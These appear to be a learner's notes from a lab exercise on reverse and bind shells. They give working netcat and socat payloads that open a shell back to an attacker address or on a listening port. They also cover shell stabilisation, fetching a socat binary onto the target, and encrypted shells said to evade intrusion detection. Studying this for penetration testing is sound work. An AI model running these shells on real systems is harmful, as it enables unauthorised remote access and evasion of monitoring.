Intro to sending (reverse) and receiving (bind) shells:

    WHAT IS A SHELL?
        * A shell is what is used to interface with a command line environment (CLI).
        * Examples include: [bash or sh programs in Linux] [cmd.exe and powershell in Windows]
        * When targeting remote systems, it is sometimes possible to force an application running to execute arbitrary code. (RCE)
        * When this happens, we want to open a shell running on the target.

        ** We can either:
            1.  Force server to send command line access to the server (reverse shell).
            2.  Force server to open a port, we connect and execute further commands (bind shell).

    TOOLS:
    **"In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell"
        NETCAT:
            * Swiss army knife of networking. 
            * Can be used to receive reverse shells, or connect to remote ports attached to bind shells.
            * Netcat shells are very unstable, but this can be improved.
            * Netcat comes installed on practically all Linux distros.

        SOCAT:
            * Netcat on steroids. Can do much more.
            * SYNTAX IS MORE DIFFICULT.
            * SOCAT RARELY INSTALLED BY DEFAULT.
            
        METASPLOIT -- MULTI/HANDLER:
            * This module [exploit/multi/handler] is used to receive reverse shells.
            * Due to being part of Metasploit, full fledged way to obtain stable shells. Options to improve shell.
            * Only way to interact with Meterpreter shell.
            * Easiest way to handle staged payloads.

        MSFVENOM:
            * Part of the Metasploit framework. Can be shipped as a standalone tool.
            * MSFVENOM is used to generate payloads on the fly.

        **OUTSIDE OF THESE TOOLS, THERE ARE REPOS CONTAINING LOTS OF SHELLS FOR DIFFERENT LANGUAGES.

        * Payloads all the Things           "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
        * PentestMonkey Cheatsheet          "https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
        * SecLists (mostly for wordlists)   "https://github.com/danielmiessler/SecLists"


        TYPES OF SHELLS:
            * "Reverse Shells":
            [
                * Target is forced to execute code that connects back to your (attacker) PC.
                * On our PC, we use Netcat or otherwise to set up a listener to receive.
                * Good for dodging firewall rules governing connection to ports on server.
                ** Drawback, if we were trying to receive a shell from machine across internet, need to configure OUR network to accept shell.
            ]

            Example Reverse Shell:
                1.  [sudo nc -lvnp 443]                 Set up listener on attacking machine
                2.  [nc <LOCAL-IP> <PORT> -e /bin/bash] On the target machine
                *** "Attacking machine listens, target sends a connection back."


            * "Bind Shells":
            [
                * Code executed on target is used to start a listener attached to a shell directly on the target.
                * This is opened up to the internet. Connect to specific port, achieve RCE.
                * This is often blocked by firewalls.
                * Don't need to configure our network!
            ]

            Example Bind Shell:
                1.  [nc -lvnp <port> -e "cmd.exe"]      On the target
                2.  [nc 10.10.143.29 <port>]            On the attacking machine

                ** Not specific to windows!
                *** "Listening on the target, connecting to it on our own machine"

            INTERACTIVITY:
                * Shells can either be interactive or non interactive.

                INTERACTIVE SHELLS:
                [
                    * Powershell, bash, zsh, sh, etc. 
                    * These are CLI that allow us to interact with programs after they are launched.
                    * Example, SSH asks for authentication (username, password). This is interactive, requires an interactive shell.
                ]

                NON-INTERACTIVE SHELLS:
                [
                    * No interaction facilitated after executing program.
                    * Hence limited to programs that do not require user interaction.
                    * UNFORTUNATELY, MOST REVERSE/BIND SHELLS ARE NON INTERACTIVE!
                    * As a result, can make exploitation difficult.
                    Example: whoami executes perfectly, SSH does not. Bc whoami requires no input!
                ]
        
        "NETCAT":
            * As seen previously, reverse shells need a listener and shellcode.
            REVERSE NC SHELL:
                [sudo nc -lvnp <port-number>]
                ...where     
                    -l is used to tell netcat that this will be a listener
                    -v is used to request a verbose output
                    -n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
                    -p indicates that the port specification will follow.
                
                * We then connect back to this with any number of payloads.

                * We can use whatever port, AS LONG AS NO SERVICE IS ALREADY RUNNING ON IT!
                * That being said, still WORTH USING KNOWN PORT NUMBERS (80, 443, 53). Gets past outbound firewall rules.

            NC BIND SHELL:
                * ASSUME there is already a listener on target, we just have to connect.
                [nc <target-ip> <chosen-port>]
                * HERE WE USE NC TO CREATE AN OUTBOUND CONNECTION TO THE TARGET ON CHOSEN PORT.

            "NETCAT SHELL STABILISATION"
                * We have caught / connected to a NC shell, what next?
                * These are very unstable by default. Ctr + C shuts it down. 
                * They're also NON-INTERACTIVE and often have strange formatting errors.
                ** [THIS IS BECAUSE THIS IS NOT A BONAFIDE SHELL. THIS IS A PROCESS WITHIN A TERMINAL!]
                ** Fortunately, there are methods to stabilise.
                * Easy to stabilise Linux, harder for Windows.

                "Technique 1: Python"
                    1.  [python3 -c 'import pty;pty.spawn("/bin/bash")']     Uses python to spawn a better featured shell!
                    2.  [export TERM=xterm]                 Gives access to more commands, e.g clear
                    3.  [CTR + Z]                           Background the shell
                    4.  [stty raw -echo; fg]                RAN ON MY PC. Turns off our own Terminal echo (arrows, TAB, CTR + C doesnt kill)
                                                            Then, foregrounds the shell, completing process.
                    ** NOTE:  If the shell dies, input in our own terminal will not be visible (disabled echo).
                        FIX:    [RESET] [ENTER]
                    
                "Technique 2: rlwrap"
                ** Program which grants us use of arrows, TAB, history. NOT CTR + C though!
                    1.  [sudo apt install rlwrap]           Install, gives arrows, TAB, history.
                    2.  [rlwrap nc -lvnp <port>]            INVOKE SLIGHTLY DIFFERENT LISTENER

                    "For Linux, complete stabilisation:"
                    4.  [stty raw -echo; fg]                RAN ON MY PC. Turns off our own Terminal echo (arrows, TAB, CTR + C doesnt kill)
                                                            Then, foregrounds the shell, completing process.
                    
                    * This grants us a much better featured shell. GREAT FOR WINDOWS!

                "Technique 3: SOCAT"
                ** Use a netcat shell as a stepping stone to better featured socat shell.
                ** Limited to Linux, no advantage for Windows (#over a netcat shell).
                1.  Nav 2 "https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"  
                        * Transfer socat static compiled binary file
                        * Typically done by using webserver on attacking machine inside directory that contains file.
                        => [sudo python3 -m http.server 80]
                2.  [wget <LOCAL-IP>/socat -O /tmp/socat]     On target, run within NC shell to download (curl either).

                WINDOWS:
                2.  [Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe]   Powershell, depends on powersh version

            ** "FOR ALL OF THE ABOVE, IT IS USEFUL TO CHANGE TERMINAL TTY SIZE"
                * In regular shells this is automatic, but not for reverse shells!
                * Do this if you want to use, e.g Text editor (Overwrites everything on screen#).

                1.  [stty -a]                   Note the values for "rows" & "columns".
                2.  [stty rows <number>]        In reverse shell, set correct number of rows.
                3.  [stty cols <number>]        In reverse shell, set correct number of columns.

            ** "This changes the registered width and height of the terminal. Important for programs like text editor"

        
        "SOCAT"
            * Think of it like a connector between two points.
            * Essentially, connects listener & keyboard. (OR 2x listener, OR listening port and file).
            ** "SOCAT IS LIKE A PORTAL GUN"

            "REVERSE SHELLS SOCAT"
                * Much more difficult syntax
                [socat TCP-L:<port> -]              Connects two points, listening port and input. Unstable shell
                                                    -> Equivalent to [nc -lvnp <port>]
                Then, on Windows:
                [socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes]
                Linux:
                [socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash-li"]

            "BIND SHELLS SOCAT"
                Linux:      [socat TCP-L:<PORT> EXEC:"bash -li"]
                Windows:    [socat TCP-L:<PORT> EXEC:powershell.exe,pipes]

            ** Pipes forces UNIX style input.

            [socat TCP:<TARGET-IP>:<TARGET-PORT> -]     Regardless of target, use this on attacking machine to connect to listener.

            "FULLY STABLE LINUX TTY REVERSE SHELL"
            NB
                [socat TCP-L:<port> FILE:`tty`,raw,echo=0]      Only on Linux, one of the most powerful features of SOCAT.
                                                                Similar to raw echo from previous. Except immediately stable.
            
            ** Can connect to this SPECIAL listener with any payload, however must do the following socat commands first.
            ** Most machine have socat installed, otherwise upload a pre compiled socat binary!
                => "https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"

            [socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane]
            ... where:
                    pty, allocates a pseudoterminal on the target -- part of the stabilisation process
                    stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
                    sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
                    setsid, creates the process in a new session
                    sane, stabilises the terminal, attempting to "normalise" it.
            * [-d -d]           Increase verbosity for debugging/ if having issues.

        "SOCAT ENCRYPTED SHELLS"
            * BOTH for reverse and bind. Cannot be spied on, hence often able to bypass IDS, (Intrusion Detection Sys).
            * Just replace TCP with OPENSSL! 
                (REVERSE SHELL)
            1.  [openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt]      On attacking machine generate SSL certificate.
            2.  [cat shell.key shell.crt > shell.pem]                   Merge the two files created by ^^
            3.  [socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -]         Set up reverse shell listener.
                                                                                verify=0 means do not check properly signed by a recognised authority.
            4.  [socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash] Connect back
            
                (BIND SHELL)
            1.  [socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes]        Ran on target
            2.  [socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -]            

            *** "Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required."

            TASK: "syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem""
                prev task:      [socat TCP-L:<port> FILE:`tty`,raw,echo=0]
                As just above:  [socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -]

                Therefore:      [socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0]

                  "If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?"
                previously:     [socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane]
                just above:     [socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash]
                Therefore:      [socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane]

            